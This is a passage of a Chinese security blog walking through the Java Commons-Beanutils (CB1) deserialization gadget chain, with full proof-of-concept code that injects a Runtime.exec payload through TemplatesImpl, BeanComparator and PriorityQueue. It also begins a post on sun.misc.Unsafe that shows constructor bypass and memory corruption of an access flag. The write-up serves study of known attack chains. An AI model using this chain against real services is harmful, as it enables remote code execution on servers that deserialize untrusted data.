class="hljs-constructor">TransletInstance()</span><br><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-12"><a href="#关键类-12" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">BeanComparator</span><br><span class="hljs-attribute">PropertyUtils</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br></code></pre></td></tr></table></figure><h4 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h4><p>什么是 JavaBean，一个类：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">所有属性为<span class="hljs-keyword">private</span><br>提供getter和setter读取<span class="hljs-keyword">private</span>属性<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h4><p>common-beanutils 提供了<code>PropertyUtils.getProperty</code>可以直接调用任意 JavaBean 的 getter</p><blockquote><p>Exception in thread “main” java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory<br>at org.apache.commons.beanutils.ConvertUtilsBean.<init>(ConvertUtilsBean.java:157)<br>at org.apache.commons.beanutils.BeanUtilsBean.<init>(BeanUtilsBean.java:117)<br>at org.apache.commons.beanutils.BeanUtilsBean$1.initialValue(BeanUtilsBean.java:68)<br>    at org.apache.commons.beanutils.ContextClassLoaderLocal.get(ContextClassLoaderLocal.java:153)<br>    at org.apache.commons.beanutils.BeanUtilsBean.getInstance(BeanUtilsBean.java:80)<br>    at org.apache.commons.beanutils.PropertyUtilsBean.getInstance(PropertyUtilsBean.java:114)<br>    at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:426)<br>    at CommonsBeanutils.Beandemo.Demo.main(Demo.java:9)<br>Caused by: java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory<br>    at java.net.URLClassLoader.findClass(URLClassLoader.java:381)<br>    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)<br>    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)<br>at java.lang.ClassLoader.loadClass(ClassLoader.java:357)<br>… 8 more</p></blockquote><p>在 pom.xml 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils.Beandemo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-number">1</span>);<br>        System.out.println(PropertyUtils.getProperty(user, <span class="hljs-string">&quot;name&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>纵观使用到了<code>TemplatesImpl</code>的链，都是调用了<code>TemplatesImpl.newTransformer</code>或者<code>TemplatesImpl.getOutputProperties</code>，两者的作用域都是 public；其中<code>getOutputProperties</code>内部调用了<code>newTransformer</code></p><p>这里注意到<code>getOutputProperties</code>是一个 getter，<code>TemplatesImpl</code>是一个 JavaBean</p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        PropertyUtils.getProperty(templatesimpl, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Gadget-12"><a href="#Gadget-12" class="headerlink" title="Gadget"></a>Gadget</h3><p>如何延长<code>PropertyUtils.getProperty</code>，查找用法发现在<code>BeanComparator.compare</code>有调用到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">( Object o1, Object o2 )</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> ( property == <span class="hljs-keyword">null</span> ) &#123;<br>        <span class="hljs-comment">// compare the actual objects</span><br>        <span class="hljs-keyword">return</span> comparator.compare( o1, o2 );<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Object value1 = PropertyUtils.getProperty( o1, property );<br>        Object value2 = PropertyUtils.getProperty( o2, property );<br>        <span class="hljs-keyword">return</span> comparator.compare( value1, value2 );<br>    &#125;<br>    <span class="hljs-keyword">catch</span><br>        ...<br></code></pre></td></tr></table></figure><p>很显然，当 o1 是<code>TemplatesUImpl</code>对象时，property 是<code>outputProperties</code>，链子就通了</p><p>comparator？等等，CC2 好像有<code>TransformingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, transformingComparator);<br></code></pre></td></tr></table></figure><p><code>PriorityQueue.readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator</code>然后就调用到了<code>comparator.compare</code>，CC2 用<code>TransformingComparator</code>的时候反射修改的<code>comparator</code>，这里当然也可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsBeanutils;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.lang3.RandomStringUtils;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><span class="hljs-comment">//        BeanComparator comparator = new BeanComparator();</span><br><span class="hljs-comment">//        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array = &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>        setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>SLF4J</strong></p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/03/15/Unsafe/"/>
    <url>/2023/03/15/Unsafe/</url>
    
    <content type="html"><![CDATA[<h1 id="sun-misc-Unsafe"><a href="#sun-misc-Unsafe" class="headerlink" title="sun.misc.Unsafe"></a>sun.misc.Unsafe</h1><p>本文参考：<a href="http://mishadoff.com/blog/java-magic-part-4-sun-dot-misc-dot-unsafe/%EF%BC%8Chttps://blog.csdn.net/zyzzxycj/article/details/89877863">http://mishadoff.com/blog/java-magic-part-4-sun-dot-misc-dot-unsafe/，https://blog.csdn.net/zyzzxycj/article/details/89877863</a></p><p>Java对内存的管理很严格，<a href="https://blog.csdn.net/bandaoyu/article/details/83418583%EF%BC%8CUnsafe%E7%B1%BB%E5%8F%AF%E4%BB%A5%E7%AA%81%E7%A0%B4JVM%EF%BC%8C%E5%AE%83%E5%88%86%E9%85%8D%E7%9A%84%E5%86%85%E5%AD%98%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8free(%E4%B8%8D%E8%A2%ABGC%E5%9B%9E%E6%94%B6)%EF%BC%8C%E5%AE%83%E4%B8%8D%E6%98%AFJ2SE%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%8C%E5%B1%9E%E4%BA%8Esun.*API">https://blog.csdn.net/bandaoyu/article/details/83418583，Unsafe类可以突破JVM，它分配的内存需要手动free(不被GC回收)，它不是J2SE的一部分，属于sun.*API</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/568153-20191216214607494-455490214.png"></p><h2 id="Unsafe类实例化"><a href="#Unsafe类实例化" class="headerlink" title="Unsafe类实例化"></a>Unsafe类实例化</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220310141213354.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220310141414128.png"></p><p>可见必须是ClassLoader加载的类，然后返回标记为<code>private</code>的theUnsafe实例</p><p>Unsafe方法有105种方法，分类如下：</p><ul><li><p>Info</p><p>Just returns some low-level memory information.</p><ul><li><code>addressSize</code></li><li><code>pageSize</code></li></ul></li><li><p>Objects</p><p>Provides methods for object and its fields manipulation.</p><ul><li><code>allocateInstance</code></li><li><code>objectFieldOffset</code></li></ul></li><li><p>Classes</p><p>Provides methods for classes and static fields manipulation.</p><ul><li><code>staticFieldOffset</code></li><li><code>defineClass</code></li><li><code>defineAnonymousClass</code></li><li><code>ensureClassInitialized</code></li></ul></li><li><p>Arrays</p><p>Arrays manipulation.</p><ul><li><code>arrayBaseOffset</code></li><li><code>arrayIndexScale</code></li></ul></li><li><p>Synchronization</p><p>Low level primitives for synchronization.</p><ul><li><code>monitorEnter</code></li><li><code>tryMonitorEnter</code></li><li><code>monitorExit</code></li><li><code>compareAndSwapInt</code></li><li><code>putOrderedInt</code></li></ul></li><li><p>Memory</p><p>Direct memory access methods.</p><ul><li><code>allocateMemory</code></li><li><code>copyMemory</code></li><li><code>freeMemory</code></li><li><code>getAddress</code></li><li><code>getInt</code></li><li><code>putInt</code></li></ul></li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="Avoid-initialization"><a href="#Avoid-initialization" class="headerlink" title="Avoid initialization"></a>Avoid initialization</h3><p>当创建一个类实例却不需要调用其构造函数(<strong>或构造函数私有</strong>)、初始化代码以及绕过各种JVM安全检查等等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Field theUnsafe = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) theUnsafe.get(<span class="hljs-keyword">null</span>);<br><br>        A a1 = (A) unsafe.allocateInstance(A.class);<br>        System.out.println(a1.getNum);<span class="hljs-comment">//打印结果为0</span><br><br>        <span class="hljs-comment">//bypass</span><br>        a1.setNum(<span class="hljs-number">666</span>);<br>        System.out.println(a1.getNum());<span class="hljs-comment">//打印结果为666</span><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num = <span class="hljs-number">123</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">A</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">this</span>.num = <span class="hljs-number">2333</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNum</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.num;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>            <span class="hljs-keyword">this</span>.num = num;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>allocateInstance()</code>方法根本没有进入构造方法，在单例模式下很危险</p><h3 id="Memory-corruption"><a href="#Memory-corruption" class="headerlink" title="Memory corruption"></a>Memory corruption</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field f = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) f.get(<span class="hljs-keyword">null</span>);<br><br>        Guard guard = <span class="hljs-keyword">new</span> Guard();<br>        <span class="hljs-keyword">boolean</span> flag1 = guard.giveAccess();   <span class="hljs-comment">// false, no access</span><br><br>        <span class="hljs-comment">// bypass</span><br>        Field field = guard.getClass().getDeclaredField(<span class="hljs-string">&quot;ACCESS_ALLOWED&quot;</span>);<br>        unsafe.putInt(guard, unsafe.objectFieldOffset(field), <span class="hljs-number">42</span>); <span class="hljs-comment">// memory corruption</span><br>        <span class="hljs-keyword">boolean</span> flag2 = guard.giveAccess(); <span class="hljs-comment">// true, access granted</span><br><br>        System.out.println(flag1);<br>        